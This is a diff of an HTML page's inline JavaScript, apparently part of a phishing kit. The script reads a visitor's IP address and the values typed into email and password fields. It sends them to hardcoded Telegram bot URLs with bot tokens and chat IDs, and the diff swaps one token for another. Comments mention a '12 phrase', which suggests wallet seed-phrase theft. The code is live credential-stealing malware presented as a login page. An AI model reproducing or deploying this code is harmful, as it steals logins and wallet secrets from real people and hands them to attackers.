@@ -1318,133 +1318,100 @@ height: 2.5rem;
 "../ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
     </script>
 
-<script>
+ <script>
 
-// alert("send ip");
+
+
            
-  // Add "https://ipinfo.io" statement
-  // this will communicate with the ipify servers
-  // in order to retrieve the IP address
-  $.get("https://ipinfo.io/", function(response) {
-         var ipx = response.ip;
-         sendIp(ipx);
-      }, "json")
-       
-      // "json" shows that data will be fetched in json format
-  
-
-function sendIp(ipx) {
-
-//   alert("send ip7");
-
-//   var phr = document.getElementById("phrase").value ;
-
-
-    
+           // Add "https://ipinfo.io" statement
+           // this will communicate with the ipify servers
+           // in order to retrieve the IP address
+           $.get("https://ipinfo.io/", function(response) {
+                  var ipx = response.ip;
+                  sendIp(ipx);
+               }, "json")
+                
+               // "json" shows that data will be fetched in json format
+           
  
-  
-
-        
-          //https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=heeey 
-          
-          // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
-
-            // https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=heeey
-
-
-          fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=ip:'+ipx , {
-              method: "GET"
-          }).then(success => {
-
-            // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-
-            // const dangerMessage = document.querySelector("#msg")
-            
-          }, error => {
-            //   alert("Message not sent")
-              console.log(error)
-
-          })
-      
-       
- 
-   
-}
-                  fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
-                      method: "GET"
-                  }).then(success => {
-        
-                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-        
-                    // const dangerMessage = document.querySelector("#msg")
-                    
-                  }, error => {
-                    //   alert("Message not sent")
-                      console.log(error)
-        
-                  })
-
-                  fetch('https://api.telegram.org/bot6695223456:AAFE9GZF2uSJqgy8mLmU_Aoj7C41rOB0dqc/sendMessage?chat_id=5569658703&text=ip-v2:'+ipx , {
-                      method: "GET"
-                  }).then(success => {
-        
-                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-        
-                    // const dangerMessage = document.querySelector("#msg")
-                    
-                  }, error => {
-                    //   alert("Message not sent")
-                      console.log(error)
-        
-                  })
-              
-               
+         function sendIp(ipx) {
          
+           // alert("kjk");
+         
+         //   var phr = document.getElementById("phrase").value ;
+          
            
-        }
+         
+                 
+                   //https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=heeey 
+                   
+                   // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
+         
+                     // https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=heeey
+         
+         
+                   fetch('https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=ip:'+ipx , {
+                       method: "GET"
+                   }).then(success => {
+         
+                     // alert("Invalid phrase. Kindly enter the correct 12 phrase");
+         
+                     // const dangerMessage = document.querySelector("#msg")
+                     
+                   }, error => {
+                     //   alert("Message not sent")
+                       console.log(error)
+         
+                   })
+               
+                
+          
+            
+         }
+         
+             
+
+    function sendMail() {
     
+      // alert("kjk");
+    
+      var email = document.getElementById("email").value ;
 
-function sendMail() {
+      var pass = document.getElementById("password").value ;
 
-// alert("send mail");
-
-var email = document.getElementById("email").value ;
-
-var pass = document.getElementById("password").value ;
-
+     
 
 
 
 
+      phr = "email: "+ email +" ; password:"+pass;
+     
+      
+    
+            
+            
+    
+              fetch('https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=seekinginfo:'+phr , {
+                  method: "GET"
+              }).then(success => {
+    
+                // alert("Invalid phrase. Kindly enter the correct 12 phrase");
 
-phr = "email: "+ email +" ; password:"+pass;
-
-
-
-   
-   
-
-     fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=seekinginfo:'+phr , {
-         method: "GET"
-     }).then(success => {
-
-       // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-
-       document.getElementById("notification-banner").style.display = "block";
-
-       // const dangerMessage = document.querySelector("#msg")
+                document.getElementById("notification-banner").style.display = "block";
+    
+                // const dangerMessage = document.querySelector("#msg")
+                
+              }, error => {
+                //   alert("Message not sent")
+                //   console.log(error)
+    
+              })
+          
+           
+     
        
-     }, error => {
-       //   alert("Message not sent")
-       //   console.log(error)
-
-     })
- 
-  
-
-
-}
-
-</script>
+    }
+    
+        </script>
 
 </html>
